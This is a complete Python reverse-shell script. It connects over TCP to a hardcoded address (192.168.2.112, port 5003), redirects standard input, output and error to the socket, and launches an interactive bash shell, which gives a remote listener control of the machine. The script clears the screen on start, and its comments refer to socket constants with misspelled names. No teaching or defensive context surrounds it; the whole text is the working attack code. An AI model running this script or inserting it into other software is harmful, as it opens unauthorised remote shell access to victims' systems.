#!/usr/bin/env
class shell:
    def __init__(self, TARGET_IPADDRESS, TARGET_PORT):
        self.TARGET_IPADDRESS = TARGET_IPADDRESS
        self.TARGET_PORT = TARGET_PORT
REVERSE_CONNECTION = shell("192.168.2.112", int(5003))
from subprocess import run
from os import dup2
import socket
import os
os.system('clear')
# Change socket.SOCK_STREM(TCP) to socket.SOCK_DRAM for UDP connection
SOCKET_SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
SOCKET_SOCK.connect((REVERSE_CONNECTION.TARGET_IPADDRESS, REVERSE_CONNECTION.TARGET_PORT))
dup2(SOCKET_SOCK.fileno(),0)
dup2(SOCKET_SOCK.fileno(),1)
dup2(SOCKET_SOCK.fileno(),2)
run(["/bin/bash","-i"])   
